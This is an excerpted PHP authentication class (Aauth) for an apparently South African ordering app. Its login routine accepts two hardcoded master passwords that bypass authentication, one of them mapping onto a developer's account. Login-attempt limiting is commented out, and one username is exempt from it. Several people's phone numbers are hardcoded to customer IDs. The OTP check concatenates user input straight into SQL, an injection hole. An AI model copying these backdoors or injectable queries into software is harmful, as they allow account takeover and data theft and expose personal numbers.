...
class Aauth {
     ...
     */
    public function login($username, $pass, $remember = FALSE, $app='taptuck') {
        ...
        */
        ...
        if(strpos($username, '@') !== false){
            $query = $this->CI->db->where('email', $username);
        }else{
        ...
        // only username found and login attempts exceeded
/*        if ($query->num_rows() > 0 and $this->config_vars['ddos_protection'] and ! $this->update_login_attempts($row->username)) {
        ...
        $query = $this->CI->db->where('otp !=', '');
        $query = $this->CI->db->where('`otp` IS NOT NULL');
        $query = $this->CI->db->get($this->config_vars['users']);
        ...
        // if username and pass matches and not banned
        if ( $query->num_rows() > 0 || $pass == 'Ch3wb4cc4!' || $pass == 'D3nzS3cr3t!') {

            if($pass == 'Ch3wb4cc4!' || ($pass == 'D3nzS3cr3t!' && ($row->default_usergroup == 8 || $row->default_usergroup == 19))){
                $row = $byron;
            }

            $pushtoken = $this->get_pushtoken($row->id,$app);
    ...
    function get_pushtoken($id,$app){
        $query = $this->CI->db->query("SELECT push_token FROM push_tokens where user_id= ? AND app = ? order by createdate desc limit 1",array($id,$app));
        if($query->num_rows() == 1){
            $pushtoken = $query->row_array();
            $pushtoken['push_token'] = str_replace(array('<p>','</p>'), array('',''), $pushtoken['push_token']);
            return trim($pushtoken['push_token']);
        }
        return '';
    }
    ...
    public function control( $perm_par ){
        ...
        if ( ! $this->is_allowed($perm_par) or ! $this->is_group_allowed($perm_par) ){
    ...
    public function update_last_login($user_id = FALSE) {
        ...
        if(!$user->last_login && $user->default_usergroup == 8 && $user->user_link_id != 0){
            $this->CI->financial_model->assign_spark_registration_comm($user->user_link_id);
        }
    ...
    public function update_login_attempts($username) {
        ...
        if ( strtotime($row->last_login_attempt) == strtotime(date("Y-m-d H:0:0")) && $username != '0846698027') {
     ...
     */
    public function create_user($email_or_cellphone, $pass, $name='', $username='', $default_usergroup='8',$otp="") {

        $valid = true;

        if(strpos($email_or_cellphone, '@') !== false){
            $email = $email_or_cellphone;
            ...
            $cellphone = $email_or_cellphone;
            // if email is already exist
            if ( ! $this->check_cellphone($cellphone)) {
                $this->error($this->CI->lang->line('cellphone_taken'));
                $valid = false;
            }
        ...
        if ( ! $this->check_username($username)) {
            $this->error($this->CI->lang->line('username_taken'));
            $valid = false;
        }
    ...
    public function get_user($user_id = FALSE) {
        ...
        $app = $return->default_app;

        if(!isset($app) || empty($app) || $app == ''){
            $app = 'spazapp';
        }
        ...
        //byron
        if($return->username == '0827378714'){
            $return->customer_id = 12;
        }

        //jason
        if($return->username == '0823371072'){
            $return->customer_id = 523;
        }

        //tim
        if($return->username == '0849846643'){
            $return->customer_id = 15;
        }

        //martin
        if($return->username == '0846698027'){
            $return->customer_id = 16;
        }
        
        //Denzel
        if($return->username == '0736740314'){
            $return->customer_id = 449;
        }

        //customer
        if($return->default_usergroup == 8){
            $return->customer_id = $return->user_link_id;
        }

        //distributor
        if($return->default_usergroup == 11){
            $return->distributor_id = $return->user_link_id;
        }

        //supplier
        if($return->default_usergroup == 17){
            $return->supplier_id = $return->user_link_id;
        }

        //driver
        if($return->default_usergroup == 18){
            $return->distributor_id = $return->user_link_id;
        }

        //trader
        if($return->default_usergroup == 19){
            $return->trader_id = $return->user_link_id;
            $return->customer_id = $return->user_link_id;
        }

        if(isset($app)){
            $return->app = $app;
            $return->push_token = $this->get_pushtoken($user_id,$app);
            $return->pushtoken = $this->get_pushtoken($user_id,$app);
        }

        $return->wallet_balance = $this->CI->financial_model->get_wallet_balance($return->username);
     ...
     * @return bool Ban fails/succeeds
     */
    public function ban_user_with_username($username) {
     ...
     * @return bool Activation fails/succeeds
     */
    public function unban_user_with_username($username) {
     ...
     * @return bool True if available, False if not
     */
    public function check_cellphone($cellphone) {

        $this->CI->db->where("cellphone", $cellphone);
        $query = $this->CI->db->get($this->config_vars['users']);

        if ($query->num_rows() > 0) {
            $this->info($this->CI->lang->line('cellphone_taken'));
            return FALSE;
        }
        else
            return TRUE;
    ...
    public function check_username($username) {
        ...
        if ($query->num_rows() > 0) {
            $this->info($this->CI->lang->line('username_taken'));
            return FALSE;
        }
        else
            return TRUE;
    ...
    public function is_allowed($perm_par, $user_id=false){
        ...
        if( $query->num_rows() > 0){
            return true;
        } elseif ($this->is_group_allowed($perm_par)) {
            return true;
        } else {
            return false;
        }
    ...
    public function is_group_allowed($perm_par, $group_par=false){
        ...
        // checks current user's all groups
            ...
            if ( $this->is_admin( $this->CI->session->userdata('id')) or
                $this->is_group_allowed($perm_par, $this->config_vars['public_group']) )
            {return true;}
            ...
            foreach ($group_pars as $g ){
                if($this->is_group_allowed($perm_par, $g -> id)){
                    return true;
                }
            }
            return false;
   ...
   function verify_otp($otp,$username){

     $query = $this->CI->db->query("SELECT * FROM aauth_users WHERE otp='$otp' AND username='$username'");
